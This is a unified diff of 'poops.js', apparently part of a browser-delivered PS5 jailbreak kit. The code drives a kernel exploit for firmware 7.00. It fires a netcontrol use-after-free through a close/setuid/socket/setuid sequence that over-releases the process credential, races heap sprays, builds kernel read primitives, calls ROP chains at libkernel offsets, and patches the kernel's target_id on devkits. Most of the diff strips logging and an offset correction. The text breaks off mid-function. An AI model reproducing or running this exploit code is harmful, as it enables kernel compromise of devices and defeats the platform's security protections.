@@ -1,29 +1,5 @@
 // @egycnq (I rewrote egys impli of poops but 90% of his code is likely still factored in)
 
-
-/* Every OFFSET_lk_* here is a libkernel_web TEXT address from
-   PS5UPDATE-devkit-7_00_00_44, and this console runs 7.00.00.70, whose
-   libkernel text is displaced by a staircase of +0xe0 .. +0x580. main.js
-   measures that and publishes the correction; rop.js was taught to use it but
-   poops.js was not, so sceKernelGetCurrentCpu -- called raw in the driver
-   thread setup, right where ps1_prepare hangs -- was jumping into the middle
-   of whatever .70 put at the .44 address.
-
-   Returns the address unchanged when no correction is published (every other
-   firmware profile), and leaves an address alone when the landmarks either
-   side of it disagree, which is the same rule used for the syscall stubs. */
-function LKFIX(rva) {
-  return (typeof window !== "undefined" && window.__lkfix)
-    ? window.__lkfix(rva)
-    : rva;
-}
-
-// Site root (the folder holding payloads/) relative to the *document* that
-// loaded this module. slopkit/poops.html keeps the historical "../"; the
-// unified index.html at the site root sets window.SLOP_ROOT = "".
-const SITE_ROOT = (typeof window !== "undefined" && window.SLOP_ROOT !== undefined)
-  ? window.SLOP_ROOT : "../";
-
 export const ERRNO = {
   1: "EPERM",
   2: "ENOENT",
@@ -163,9 +139,6 @@ export function buildRthdr(u8, off, size) {
   return (len + 1) << 3;
 }
 
-export function w8(u8, o, v) {
-  u8[o] = v & 0xff;
-}
 export function w16(u8, o, v) {
   u8[o] = v & 0xff;
   u8[o + 1] = (v >>> 8) & 0xff;
@@ -194,14 +167,6 @@ export function w64(u8, o, v) {
     w32(u8, o + 4, Math.floor(v / 0x100000000) >>> 0);
   }
 }
-export function r64hex(u8, o) {
-  const hi = r32(u8, o + 4),
-    lo = r32(u8, o);
-  return hi === 0
-    ? lo.toString(16)
-    : hi.toString(16) + lo.toString(16).padStart(8, "0");
-}
-
 export function coreList(mask) {
   const out = [];
   for (let i = 0; i < 32; ++i) if ((mask >>> i) & 1) out.push(i);
@@ -557,7 +522,7 @@ export function makeHarness(X) {
       t.write_result4(S.ptr("affret", wid));
     }
 
-    t.fcall(P.libKernelBase.add32(LKFIX(OFFSET_lk_sceKernelGetCurrentCpu)));
+    t.fcall(P.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu));
     t.write_result(S.ptr("cpu", wid));
 
     t.push_write8(S.ptr("status", wid), TK.ST_READY);
@@ -1183,10 +1148,10 @@ export function makeHarness(X) {
   async function driverCurrentCpu() {
     flushMark(
       "DRV-CPU-PRE",
-      "fn=lk+0x" + LKFIX(OFFSET_lk_sceKernelGetCurrentCpu).toString(16),
+      "fn=lk+0x" + OFFSET_lk_sceKernelGetCurrentCpu.toString(16),
     );
     const v = await chainCall(
-      P.libKernelBase.add32(LKFIX(OFFSET_lk_sceKernelGetCurrentCpu)),
+      P.libKernelBase.add32(OFFSET_lk_sceKernelGetCurrentCpu),
     );
     flushMark("DRV-CPU", "cpu=" + (v & 0xffff));
     return v;
@@ -2169,7 +2134,7 @@ export function makeTwinEngine(X) {
         first.getSample = retGetOf(0, 0);
         first.optlenSample = optlenOf(0, 0);
 
-        flushMark(
+        scanMark(
           "TWIN-FIRST-CALLS",
           "set_rthdr[0]=" +
             first.spraySample +
@@ -3050,12 +3015,6 @@ export const PSYS = {
   DYNLIB_DLSYM: 0x24f,
   IOCTL: 0x36,
   PIPE2: 0x2af,
-  /* sceKernelDebugOutText. libkernel_web 0x00AE00 on 7.00 is three
-     instructions -- `mov rdx,rdi ; mov edi,7 ; jmp <syscall 0x259 stub>` --
-     so the chain raises it BY NUMBER and never touches the module, which also
-     side-steps this console's build shift. Args as the wrapper passes them:
-     (7, text, channel). */
-  DEBUG_OUT_TEXT: 0x259,
 };
 
 export const PK = {
@@ -3203,41 +3162,50 @@ export const PK = {
 
 
 
+  // Needed only by the kit-only target_id exception below. poopsploit finds allproc by
+  // walking from curproc, so these give kdata_base = allproc - KERNEL_ALLPROC.
+  KERNEL_ALLPROC:
+    typeof OFFSET_KERNEL_ALLPROC === "number" ? OFFSET_KERNEL_ALLPROC : -1,
+  KERNEL_SECURITY_FLAGS:
+    typeof OFFSET_KERNEL_SECURITY_FLAGS === "number"
+      ? OFFSET_KERNEL_SECURITY_FLAGS
+      : -1,
+
   LK_PTHREAD_CREATE_NAME_NP:
     typeof OFFSET_lk_pthread_create_name_np === "number"
-      ? LKFIX(OFFSET_lk_pthread_create_name_np)
+      ? OFFSET_lk_pthread_create_name_np
       : -1,
   LK_PTHREAD_JOIN:
-    typeof OFFSET_lk_pthread_join === "number" ? LKFIX(OFFSET_lk_pthread_join) : -1,
+    typeof OFFSET_lk_pthread_join === "number" ? OFFSET_lk_pthread_join : -1,
   LK_SCE_PTHREAD_CREATE:
     typeof OFFSET_lk_scePthreadCreate === "number"
-      ? LKFIX(OFFSET_lk_scePthreadCreate)
+      ? OFFSET_lk_scePthreadCreate
       : -1,
   LK_SCE_PTHREAD_JOIN:
-    typeof OFFSET_lk_scePthreadJoin === "number" ? LKFIX(OFFSET_lk_scePthreadJoin) : -1,
+    typeof OFFSET_lk_scePthreadJoin === "number" ? OFFSET_lk_scePthreadJoin : -1,
   LK_SCE_PTHREAD_ATTR_INIT:
     typeof OFFSET_lk_scePthreadAttrInit === "number"
-      ? LKFIX(OFFSET_lk_scePthreadAttrInit)
+      ? OFFSET_lk_scePthreadAttrInit
       : -1,
   LK_SCE_PTHREAD_ATTR_SETSTACKSIZE:
     typeof OFFSET_lk_scePthreadAttrSetstacksize === "number"
-      ? LKFIX(OFFSET_lk_scePthreadAttrSetstacksize)
+      ? OFFSET_lk_scePthreadAttrSetstacksize
       : -1,
   LK_SCE_PTHREAD_ATTR_SETDETACHSTATE:
     typeof OFFSET_lk_scePthreadAttrSetdetachstate === "number"
-      ? LKFIX(OFFSET_lk_scePthreadAttrSetdetachstate)
+      ? OFFSET_lk_scePthreadAttrSetdetachstate
       : -1,
   LK_SCE_PTHREAD_ATTR_DESTROY:
     typeof OFFSET_lk_scePthreadAttrDestroy === "number"
-      ? LKFIX(OFFSET_lk_scePthreadAttrDestroy)
+      ? OFFSET_lk_scePthreadAttrDestroy
       : -1,
   LK_NOTIFY: typeof OFFSET_lk_sceKernelSendNotificationRequest === "number"
-    ? LKFIX(OFFSET_lk_sceKernelSendNotificationRequest) : -1,
+    ? OFFSET_lk_sceKernelSendNotificationRequest : -1,
   LK_SYSCTLBYNAME: typeof OFFSET_lk_sysctlbyname === "number"
-    ? LKFIX(OFFSET_lk_sysctlbyname) : -1,
+    ? OFFSET_lk_sysctlbyname : -1,
   LK_PTHREAD_CREATE: typeof OFFSET_lk_pthread_create === "number"
-    ? LKFIX(OFFSET_lk_pthread_create) : -1,
-  LK_GETPID: typeof OFFSET_lk_getpid === "number" ? LKFIX(OFFSET_lk_getpid) : -1,
+    ? OFFSET_lk_pthread_create : -1,
+  LK_GETPID: typeof OFFSET_lk_getpid === "number" ? OFFSET_lk_getpid : -1,
   LC_MALLOC: typeof OFFSET_lc_malloc === "number" ? OFFSET_lc_malloc : -1,
   LC_FREE: typeof OFFSET_lc_free === "number" ? OFFSET_lc_free : -1,
   LC_MEMCPY: typeof OFFSET_lc_memcpy === "number" ? OFFSET_lc_memcpy : -1,
@@ -3299,10 +3267,6 @@ export const PK = {
 
 const M1LO = 0xffffffff,
   M1HI = 0xffffffff;
-
-export function r64parts(u8, o) {
-  return { low: r32(u8, o) >>> 0, hi: r32(u8, o + 4) >>> 0 };
-}
 
 export function isKernelPtr(v) {
   return v !== null && v !== undefined && v.hi >>> 16 === 0xffff;
@@ -3431,10 +3395,6 @@ export function makePoopsEngine(X) {
     leakedIovFirst: null,
 
     crfrees: 0,
-    /* Set when SET_QUEUE reports every slot occupied. Nothing was triggered in
-       that case, so no other verdict reason fires -- and yet the only remedy is
-       a reboot, which is what the run has to end up saying. */
-    slotsExhausted: false,
     kreadCalls: 0,
     kreadOk: 0,
     kqueuesOpened: 0,
@@ -3465,21 +3425,7 @@ export function makePoopsEngine(X) {
   }
   function emit(num, retPtr, a1, a2, a3, a4, a5) {
     needStub(num, "unrolled chain emit");
-    /* By-number-only syscalls must NOT be fcall'd.
-       -----------------------------------------------------------------------
-       emit() used to jump straight to P.syscalls[num], i.e. the stub ADDRESS.
-       On 7.00.00.70 thirty-five stubs have no known address, and main.js gives
-       those an entry pointing at the bare syscall instruction instead -- which
-       is right for fsyscall, because fsyscall loads rax, and catastrophic for a
-       raw fcall, which executes whatever number rax happened to hold.
-       SETUID (0x17) is one of them. That is how the netcontrol sandwich killed
-       the process one line after NETCTRL-SET: close/setuid/socket/setuid in a
-       single chain, and the setuid slots ran a wild syscall.
-       fsyscall() already picks the right form for all three cases (proven
-       address, no syscall instruction, or by number), so hand those to it. */
-    if (P.byNumberOnly && P.byNumberOnly[num])
-      chain.fsyscall(num, a1, a2, a3, a4, a5);
-    else chain.fcall(P.syscalls[num], a1, a2, a3, a4, a5);
+    chain.fcall(P.syscalls[num], a1, a2, a3, a4, a5);
     chain.write_result4(retPtr);
   }
 
@@ -3512,100 +3458,6 @@ export function makePoopsEngine(X) {
 
   function alloc(nbytes, label) {
     return TW.arena(nbytes, label);
-  }
-
-  /* The devkit console, and the only log channel a WebProcess death cannot
-     erase.
-     -------------------------------------------------------------------------
-     Everything else we have is inside the dying process: the screen repaints at
-     most every 250ms inside a race window, queued marks go with the heap, and
-     the localStorage trail survives but is only readable on the NEXT load. Text
-     handed to syscall 0x259 is in the kernel's hands the moment it returns, and
-     Target Manager already has it.
-     Deliberately NOT wired into flushMark: this launches a ROP chain, the chain
-     is a single shared resource, and firing one from an unawaited mark handler
-     would interleave it with whatever chain is already running. Every call site
-     awaits. */
-  let ttyArena = null,
-    ttySeq = 0,
-    ttyProbed = 0,
-    ttyMode = "";
-  async function tty(text) {
-    if (ttyProbed && ttyMode === "none") return -1;
-    if (!ttyArena) ttyArena = alloc(0x140, "tty");
-    const line =
-      "[slopkit " +
-      ++ttySeq +
-      "] " +
-      String(text == null ? "" : text)
-        .replace(/[^ -~]/g, " ")
-        .slice(0, 0x100) +
-      String.fromCharCode(10);
-    const u8 = ttyArena.u8;
-    for (let i = 0; i < line.length; ++i) u8[i] = line.charCodeAt(i) & 0x7f;
-    u8[line.length] = 0;
-    const n = line.length;
-
-    /* sys(), NOT runBuilt/emit/retPtr.
-       -----------------------------------------------------------------------
-       The first tty call is PS1-ENTER, which happens before ps1_prepare gets
-       as far as buildBuffers() -- and retPtr()/armRet() read S.buf, which does
-       not exist until then. Hand-building the chain here threw on the very
-       first line and cost the whole channel, after it had been proven working.
-       sys() carries its own return cell and has no such dependency.
-
-       0x259 first: it is PROVEN on this console, twelve lines in order in the
-       serial log. It is not a printf -- its callers pass rdi = a small KIND
-       code (3, 0xa, 0xb, 0xd ... 0x27 in libkernel_web alone) and
-       sceKernelDebugOutText is merely kind 7 -- so fd 1 and fd 2 stay as
-       fallbacks for a build where the stub is missing or the call is refused.
-       The WebProcess demonstrably has stdout: the serial log carries
-       "SceNKWebProcess: arg[0] = ..." at every spawn. */
-    let how = "",
-      ret = -1;
-    if (
-      ttyMode !== "fd1" &&
-      ttyMode !== "fd2" &&
-      P.syscalls[PSYS.DEBUG_OUT_TEXT] !== undefined
-    ) {
-      const r = await sys(PSYS.DEBUG_OUT_TEXT, 7, ttyArena.base, 0);
-      if (!r.failed) {
-        how = "0x259";
-        ret = r.s32;
-      }
-    }
-    if (!how && ttyMode !== "fd2") {
-      const w = await sys(PSYS.WRITE, 1, ttyArena.base, n);
-      if (!w.failed && w.s32 > 0) {
-        how = "fd1";
-        ret = w.s32;
-      }
-    }
-    if (!how) {
-      const w2 = await sys(PSYS.WRITE, 2, ttyArena.base, n);
-      if (!w2.failed && w2.s32 > 0) {
-        how = "fd2";
-        ret = w2.s32;
-      }
-    }
-    ttyMode = how || "none";
-    if (!ttyProbed) {
-      ttyProbed = 1;
-      flushMark("TTY", "using=" + ttyMode + "-ret=" + ret);
-    }
-    return how ? 0 : -1;
-  }
-
-  /* So the run's LAST line can say whether any of this worked -- the TTY mark
-     itself fires once, early, and scrolls away long before anyone reads the
-     screen. */
-  function ttyState() {
-    return ttyMode || (ttyProbed ? "none" : "untried");
-  }
-
-  async function ttyMark(tag, extra) {
-    flushMark(tag, extra);
-    await tty(tag + " " + (extra == null ? "" : extra));
   }
 
   function buildBuffers() {
@@ -3733,57 +3585,12 @@ export function makePoopsEngine(X) {
       "PIPE2-PRE",
       label + "-out=0x" + S.buf.pipefd.base.toString() + "-flags=O_NONBLOCK",
     );
-    /* pipe2 with a non-zero flags argument never returns on 7.00.00.70 --
-       reproduced outside poops, while flags=0 works and an invalid flag errors
-       promptly. Reach the same state the long way: create the pipe, then set
-       O_NONBLOCK on each end with the fcntl call this file already uses on its
-       socketpair write end. */
-    const noFlags = typeof window !== "undefined" && window.__pipe2NoFlags;
-    const r = await sys(PSYS.PIPE2, S.buf.pipefd.base,
-        noFlags ? 0 : K.O_NONBLOCK);
+    const r = await sys(PSYS.PIPE2, S.buf.pipefd.base, K.O_NONBLOCK);
     if (r.failed) throw new Error("pipe2(" + label + ") failed: " + r.errText);
     const a = r32(S.buf.pipefd.u8, 0) | 0,
       b = r32(S.buf.pipefd.u8, 4) | 0;
     if (a < 0 || b < 0)
       throw new Error("pipe2(" + label + ") gave " + a + "," + b);
-    if (noFlags) {
-      /* Log the fds BEFORE touching them. Both hangs so far -- pipe2 with a
-         flag, and now fcntl(F_SETFL) -- are operations that set O_NONBLOCK,
-         which is suspicious in a way the syscall numbers are not: the common
-         factor may be WHICH fd is being modified rather than which call does
-         it. If pipe2 handed back a number that aliases something the
-         WebProcess relies on (its Worker message channel, say), marking that
-         non-blocking would break the very path the worker answers on -- and
-         "neither answered nor crashed" is exactly what that looks like.
-         These numbers cost one mark and settle it. */
-      /* a=33 b=36 last run: sane descriptors, nothing aliased, so the
-         "we non-blocked the WebProcess's own channel" theory is dead. What
-         hung was fcntl(F_SETFL) on `a` -- the READ end -- and that call should
-         never have been made. This pipe is a wake gate: emitRacerLoop parks
-         each racer in read(rfd, buf, 1) precisely so it BLOCKS until woken.
-         Marking the read end non-blocking asks for the opposite of what the
-         design wants, and pipe2(buf, O_NONBLOCK) set it on both ends, which is
-         why that hung in the same place.
-         So only the write end gets the flag, which is the end that must never
-         stall a wakeup. Failure there is reported rather than thrown: a
-         blocking write to an empty pipe cannot block anyway. */
-      /* No O_NONBLOCK at all. Three routes into the kernel's fd-flag code
-         have now hung: pipe2 with the flag, fcntl(F_SETFL) on the read end,
-         and fcntl(F_SETFL) on the write end (r=35 w=41, so not a bad
-         descriptor either). Which end it is does not matter, so the fault is
-         the flag operation itself on this build -- and this is a devkit debug
-         kernel, where a lock that a retail build never contends is exactly the
-         sort of thing that deadlocks.
-         The flag is not needed. This pipe is a wake gate: the racer must BLOCK
-         in read(rfd, buf, 1) until woken, so the read end has to stay
-         blocking; and the wakeup is a single byte into an empty pipe, which
-         cannot block a writer whether or not O_NONBLOCK is set. So the pipe is
-         used exactly as pipe2(buf, 0) returns it, and nothing downstream
-         depends on the difference. */
-      flushMark("PIPE2-FCNTL", label + "-r=" + a + "-w=" + b
-        + "-O_NONBLOCK-skipped: fd-flag calls hang on this build and a"
-        + "-1-byte-wakeup-cannot-block-anyway");
-    }
     track(a);
     track(b);
     flushMark("PIPE2", label + "-r=" + a + "-w=" + b);
@@ -4087,7 +3894,7 @@ export function makePoopsEngine(X) {
     if (S.uafSock >= 0 && !S.uafClosed) {
       await sys(PSYS.CLOSE, S.uafSock);
       untrack(S.uafSock);
-      await ttyMark(
+      flushMark(
         "NETCTRL-UAF-RECYCLED",
         "closed=" + S.uafSock + "-before-new-sandwich (lua:665)",
       );
@@ -4117,7 +3924,7 @@ export function makePoopsEngine(X) {
       b.setBuf.base,
       8,
     );
-    await ttyMark("NETCTRL-SET", "slot=-1-ret=" + r.s32 + "-" + r.errText);
+    flushMark("NETCTRL-SET", "slot=-1-ret=" + r.s32 + "-" + r.errText);
     if (r.failed || r.s32 !== 0) {
       flushMark("NETCTRL-SET-PRE", "slot=1-fallback (poops.c:685-694)");
       r = await sys(
@@ -4127,7 +3934,7 @@ export function makePoopsEngine(X) {
         b.setBuf.base,
         8,
       );
-      await ttyMark("NETCTRL-SET", "slot=1-ret=" + r.s32 + "-" + r.errText);
+      flushMark("NETCTRL-SET", "slot=1-ret=" + r.s32 + "-" + r.errText);
       if (r.failed || r.s32 !== 0) {
         await sys(PSYS.CLOSE, discard);
         untrack(discard);
@@ -4150,100 +3957,30 @@ export function makePoopsEngine(X) {
         "; next setuid(1) is irreversible for the boot",
     );
 
-    /* close, setuid, socket, setuid in ONE chain.
-       -----------------------------------------------------------------------
-       7.00's CLEAR_QUEUE matches a queue slot by the FD NUMBER the slot stored
-       at +0x10 (`mov edx,[rdi+0x10] ; cmp edx,[r14]`), so the whole trigger
-       depends on the fresh socket landing on the number the discard socket had.
-       As four separate chain launches there are milliseconds of JS and awaits
-       between the close and the socket, and any other thread in this
-       WebProcess that opens a descriptor in that window takes the number
-       first. Observed on device: discard 122 closed, socket came back 124,
-       CLEAR matched no slot and returned -1, and a netcontrol slot -- one of
-       the two this boot has -- was spent for nothing.
-       One chain closes the window to the length of four syscalls. */
-    /* getuid on both ends of the sandwich.
-       -----------------------------------------------------------------------
-       The whole point of the two setuid(1) calls is that each one hands the
-       thread a NEW ucred, so the credential the over-release frees is one the
-       thread is no longer running on. If this process is ALREADY uid 1, setuid
-       is a no-op, no new cred is allocated, and CLEAR frees the credential
-       under the running thread -- which is exactly what "CLEAR returns 0 and
-       the process dies immediately" looks like, every time, across three
-       different builds of the instrumentation.
-       Both reads are inside the pre-free window, where syscalls are free. */
-    await runBuilt("netctrl-sandwich", () => {
-      armRet(6);
-      emit(PSYS.GETUID, retPtr(0));
-      emit(PSYS.CLOSE, retPtr(1), discard);
-      emit(PSYS.SETUID, retPtr(2), 1);
-      emit(PSYS.SOCKET, retPtr(3), K.AF_UNIX, K.SOCK_STREAM, 0);
-      emit(PSYS.SETUID, retPtr(4), 1);
-      emit(PSYS.GETUID, retPtr(5));
-    });
+    await sys(PSYS.CLOSE, discard);
     untrack(discard);
-    S.setuidCalls += 2;
-    await ttyMark(
-      "NETCTRL-SANDWICH",
-      "uidBefore=" + retOf(0) + "-close=" + retOf(1) + "-setuid=" + retOf(2)
-        + "-socket=" + retOf(3) + "-setuid2=" + retOf(4)
-        + "-uidAfter=" + retOf(5) + "-wanted=" + discard,
-    );
-    let uafFd = retOf(3);
-    if (uafFd < 0)
-      throw new Error(
-        "uaf socket failed inside the sandwich chain: ret=" +
-          uafFd +
-          " (close=" +
-          retOf(1) +
-          ", setuid=" +
-          retOf(2) +
-          ")",
-      );
-
-    /* Fallback for the case the chain cannot prevent: the number was already
-       gone before we closed it. Hold each wrong descriptor so the allocator
-       cannot hand it straight back, and ask again -- the number is only
-       unavailable while somebody else holds it. Everything that is not the
-       number we need is handed back afterwards. */
-    const strays = [];
-    for (let i = 0; uafFd !== discard && i < 4; ++i) {
-      strays.push(uafFd);
-      await yieldN(2);
-      const again = await sys(PSYS.SOCKET, K.AF_UNIX, K.SOCK_STREAM, 0);
-      if (again.failed) break;
-      uafFd = again.s32;
-    }
-    for (const fd of strays) await sys(PSYS.CLOSE, fd);
-    if (strays.length)
-      await ttyMark(
-        "NETCTRL-UAF-RETRY",
-        "wanted=" +
-          discard +
-          "-strays=" +
-          strays.join(".") +
-          "-landedOn=" +
-          uafFd,
-      );
-
-    S.uafSock = uafFd;
+    await sys(PSYS.SETUID, 1);
+    S.setuidCalls++;
+    const us = await sys(PSYS.SOCKET, K.AF_UNIX, K.SOCK_STREAM, 0);
+    if (us.failed) throw new Error("uaf socket failed: " + us.errText);
+    S.uafSock = us.s32;
     S.uafClosed = false;
     S.uafSocks.push(S.uafSock);
     track(S.uafSock);
-    await ttyMark(
+    await sys(PSYS.SETUID, 1);
+    S.setuidCalls++;
+    flushMark(
       "NETCTRL-UAF",
       "uaf_sock=" +
         S.uafSock +
         "-reusedFdNumber=" +
         (S.uafSock === discard ? "YES" : "NO-" + discard) +
-        "-closeRet=" +
-        retOf(0) +
         "-setuidCalls=" +
         S.setuidCalls,
     );
 
     w32(b.clrBuf.u8, 0, S.uafSock);
-    await ttyMark(
+    flushMark(
       "NETCTRL-CLEAR-PRE",
       "slot=" +
         slot +
@@ -4259,19 +3996,6 @@ export function makePoopsEngine(X) {
       b.clrBuf.base,
       8,
     );
-    /* flushMark, NOT ttyMark.
-       -----------------------------------------------------------------------
-       CLEAR is the over-release. From the instant it returns, the credential
-       this process runs on may be freed while td_ucred still points at it, and
-       the next syscall that touches a cred walks freed memory. tty() is a chain
-       launch -- syscalls, in that window, for a log line. The run died right
-       here with NETCTRL-CLEAR as the last thing in the transcript, which is
-       both what a working over-release looks like and what an unnecessary
-       syscall after one looks like; there is no reason to keep paying for the
-       second while trying to observe the first.
-       Nothing is lost: the mark still reaches the screen and the durable trail,
-       and clearRet is carried out to STAGE0-ROW, which is raised after the
-       attempt is over and is on the serial channel. */
     flushMark("NETCTRL-CLEAR", "ret=" + cr.s32 + "-" + cr.errText);
     return {
       ok: true,
@@ -4380,8 +4104,7 @@ export function makePoopsEngine(X) {
     const o = opts || {}, n = TW.S.n, b = S.buf;
     const rep = {
       ok: false, step: "", detail: "", twins: null,
-      reclaimRounds: -1, tripletAttempts: [-1, -1],
-      uaf: -1, reused: "?", clearRet: undefined
+      reclaimRounds: -1, tripletAttempts: [-1, -1]
     };
     const at = (s) => {
       rep.step = s;
@@ -4405,27 +4128,9 @@ export function makePoopsEngine(X) {
 
     at(STEPS[1]);
     const pre = await preFlushAct();
-    if (pre && pre.ok && pre.clearRet !== undefined) {
-      rep.uaf = pre.uaf;
-      rep.reused = pre.reused ? "Y" : "N";
-      rep.clearRet = pre.clearRet;
-    }
     if (pre && pre.ok === false) {
-      /* Lead with the remedy when there is one. Both netcontrol slots stay
-         occupied for the rest of the boot once a trigger has fired -- that is
-         what "next setuid(1) is irreversible for the boot" means -- so every
-         later run arms nothing and fails in 10ms with crfrees=0. The reason
-         says so, but it says so at the END of a line the screen truncates, so
-         it reads as an unexplained failure and invites debugging something
-         that is working correctly. */
-      const exhausted = /netcontrol slots occupied/.test(pre.why || "");
-      if (exhausted) S.slotsExhausted = true;
-      rep.detail = (exhausted ? "REBOOT REQUIRED -- " : "")
-        + "trigger did not arm: " + (pre.why || "?");
+      rep.detail = "trigger did not arm: " + (pre.why || "?");
       rep.terminal = !!pre.terminal;
-      if (exhausted)
-        await ttyMark("TRIGGER-EXHAUSTED", "both netcontrol slots were consumed by"
-          + " an earlier trigger this boot; nothing can arm until reboot");
       return rep;
     }
     flushQueueSoft();
@@ -4463,24 +4168,13 @@ export function makePoopsEngine(X) {
     }
     closeWindow();
     flushQueueSoft();
-    /* The one line that says WHY there was no twin, and the only place the
-       census reaches the screen. Kept short enough to survive the 110-char
-       clip, and carrying untouched/notag/optlen as well as the fail counts:
-       "spray=0 read=0 untch=0" with examined>0 means the spray is landing and
-       the allocation simply is not being handed out twice, which is a
-       statement about the BUG. Any of them non-zero is a statement about the
-       spray, which is a different problem entirely. */
     if (!tw.found && tw.total)
-      await ttyMark(
+      flushMark(
         "TWIN-SCAN-DONE",
-        "reason=" + (tw.reason || "?") + "-a=" + tw.attempts
-          + "-ms=" + tw.ms
-          + "-spray=" + tw.total.sprayFailCount
-          + "-read=" + tw.total.readFailCount
-          + "-self=" + tw.total.selfTagged + "/" + tw.total.examined
-          + "-untch=" + tw.total.untouchedCount
-          + "-notag=" + tw.total.tagAbsentCount
-          + "-optlen=" + tw.total.optlenWrongCount
+        "reason=" + (tw.reason || "?") + "-attempts=" + tw.attempts
+          + "-ms=" + tw.ms + "-totSprayFail=" + tw.total.sprayFailCount
+          + "-totReadFail=" + tw.total.readFailCount + "-totSelf="
+          + tw.total.selfTagged + "of" + tw.total.examined
       );
     if (!tw.found) {
       rep.detail = "no twin in " + tw.attempts + " rounds ("
@@ -4717,39 +4411,17 @@ export function makePoopsEngine(X) {
     const deadlineAt = Date.now() + (settings.deadlineMs || 180000);
     const startedAt = Date.now();
     const log = [];
-    const steps = [];
     let lastReport = null;
-
-    /* One line naming the furthest any attempt got, emitted on every exit.
-       With eight attempts the rows scroll off a twelve-line screen, and the
-       failure line quotes only the last attempt -- which, once the netcontrol
-       slots are spent, is always the degenerate "could not arm" one. */
-    const finish = async (res) => {
-      const order = STEPS.slice();
-      let best = "none", bestIdx = -1, reached = 0;
-      for (const st of steps) {
-        const i = order.indexOf(st);
-        if (i > bestIdx) { bestIdx = i; best = st; }
-      }
-      for (const st of steps) if (st === best) reached++;
-      await ttyMark(
-        "STAGE0-STEPS",
-        "furthest=" + best +
-          "-atStep=" + bestIdx + "-of-" + (order.length - 1) +
-          "-reachedBy=" + reached + "-of-" + steps.length + "-raced"
-      );
-      return res;
-    };
 
     for (let attempt = 1; attempt <= maxAttempts; attempt += 1) {
       if (Date.now() > deadlineAt) {
-        return finish({
+        return {
           ok: false,
           attempts: attempt - 1,
           ms: Date.now() - startedAt,
           log: log,
           why: "wall-clock deadline"
-        });
+        };
       }
 
       flushMark(
@@ -4829,40 +4501,6 @@ export function makePoopsEngine(X) {
           (report.detail ? " -- " + report.detail.slice(0, 160) : "")
       );
 
-      /* The same thing, as a mark.
-         -------------------------------------------------------------------
-         Which step an attempt reached has only ever been visible in `log`,
-         which reaches note(), which lands in the results table -- not in the
-         mark stream the operator is actually reading. So a stage 0 that runs
-         three real attempts and then fails to arm on the fourth reports only
-         the fourth: "attempt could not arm", hiding the three that raced.
-         Every field here is one the attempt already measured; keep the line
-         under the screen's 110-char clip so none of it is lost. */
-      steps.push(report.step);
-      /* Defensive: this runs inside a live attempt loop, and a TypeError here
-         would take down a stage that is otherwise working. */
-      const listOf = (v) => (v && typeof v.join === "function"
-        ? v.join(".") : v == null ? "none" : String(v));
-      let rowDetail;
-      try {
-        rowDetail =
-          "a" + attempt +
-          "-" + report.step +
-          "-twins=" + listOf(report.twins) +
-          "-blk=" + report.blockedAfterSignal + "/" + report.iovRacers +
-          "-recv=" + report.recvmsgRet +
-          "-rec=" + report.reclaimRounds +
-          "-trip=" + listOf(report.tripletAttempts) +
-          (report.clearRet === undefined
-            ? ""
-            : "-uaf=" + report.uaf + "/" + report.reused + "/" + report.clearRet) +
-          "-" + attemptElapsedMs + "ms";
-      } catch (e) {
-        rowDetail = "a" + attempt + "-" + report.step
-          + "-rowFailed=" + String((e && e.message) || e).slice(0, 60);
-      }
-      await ttyMark("STAGE0-ROW", rowDetail);
-
       if (report.ok) {
         flushMark(
           "STAGE0-OK",
@@ -4874,48 +4512,48 @@ export function makePoopsEngine(X) {
             (Date.now() - startedAt)
         );
         await sleep(PK.SUCCESS_SETTLE_MS);
-        return finish({
+        return {
           ok: true,
           attempts: attempt,
           ms: Date.now() - startedAt,
           log: log,
           last: report
-        });
+        };
       }
 
       if (report.terminal) {
-        return finish({
+        return {
           ok: false,
           attempts: attempt,
           ms: Date.now() - startedAt,
           log: log,
           why: "attempt could not arm: " + (report.detail || "?"),
           last: report
-        });
+        };
       }
 
       if (TW.corrupt) {
-        return finish({
+        return {
           ok: false,
           attempts: attempt,
           ms: Date.now() - startedAt,
           log: log,
           why: "alias exists, attempt_race not re-enterable: " + TW.corrupt,
           last: report
-        });
+        };
       }
 
       await sleepK(PK.ATTEMPT_GAP_MS);
     }
 
-    return finish({
+    return {
       ok: false,
       attempts: maxAttempts,
       ms: Date.now() - startedAt,
       log: log,
       why: "all " + maxAttempts + " attempts failed",
       last: lastReport
-    });
+    };
   }
 
   function buildUio(dst, iovPtr, td, isRead, kaddr, size) {
@@ -7101,15 +6739,6 @@ export function makePoopsEngine(X) {
         "cr_ref wrapped by the full burn: below the number " +
           "of files holding the credential",
       );
-    /* Last, so it never displaces a reason describing something this run did.
-       It is the only reason that can fire on a run which changed nothing at
-       all, and without it such a run ends on a bare "FAILED" while the fix is
-       to power-cycle. */
-    if (S.slotsExhausted)
-      reasons.push(
-        "both netcontrol slots were already spent earlier this " +
-          "boot -- nothing can arm until the console is rebooted",
-      );
     if (reasons.length)
       return {
         reboot: true,
@@ -8142,7 +7771,102 @@ export function makePoopsEngine(X) {
     finally { setRaceMode(wasRace); }
   }
 
-  async function stage5Body(opts) {
+  // Kit-only target_id exception. Ported from p2jb.js's kexp_maybe_keep_kit_id.
+  //
+  // The kexp blob HARD-OVERWRITES target_id = 0x82 at 0x3807, so a retail console
+  // presents as a testkit. That is deliberate and REQUIRED: leaving a RETAIL console
+  // with its own target_id sends downstream code onto a path it was never meant to run
+  // and CAN PANIC THE KERNEL. An unconditional restore was shipped once and reverted.
+  //
+  // On a DEVKIT the forced 0x82 makes Release Check Mode read "Release": the testkit XML
+  // entry for key 0x78020300 has no Development option, so a stored DEVELOPMENT
+  // boot_param becomes unselectable, and 48 devkit-only settings go with it. NOPing the
+  // overwrite keeps the console's own 0x81 and restores them.
+  //
+  // Gated on the LIVE target_id, never on the landing page's console-type picker: a
+  // mis-picked "devkit" on a retail console is exactly the case that panics. A wrong
+  // base, a missing profile value or a failed read all yield an id that is not 0x81 and
+  // take the byte-identical stock path. ?keepkitid=0 disables, ?keepkitid=1 forces - and
+  // the force is still gated on a kit-ish id, so it cannot keep a retail id.
+  async function kexpMaybeKeepKitId(bin) {
+    const q = String(location.search || "");
+    const disabled = /[?&]keepkitid=0/i.test(q);
+    const forced = /[?&]keepkitid=1/i.test(q);
+    let tid = -1, why = "";
+    try {
+      if (PK.KERNEL_ALLPROC < 0 || PK.KERNEL_SECURITY_FLAGS <= 0) {
+        why = "-no-kernel-globals-in-profile";
+      } else {
+        if (!S.allproc) { try { await getAllproc(); } catch (e) {} }
